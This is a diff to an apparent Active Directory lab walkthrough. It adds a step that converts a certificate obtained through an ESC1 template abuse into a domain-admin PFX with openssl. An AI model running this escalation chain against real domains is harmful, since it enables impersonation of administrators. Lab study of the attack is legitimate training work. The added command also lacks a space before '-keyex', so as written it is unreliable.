@@ -911,3 +911,11 @@ Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template
 - Then save it with the name `esc1.pem` 
 
 ![](https://i.imgur.com/niHO6bN.png)
+
+
+- Run the below command
+
+
+```powershell
+C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc1.pem-keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-DA.pfx
+```
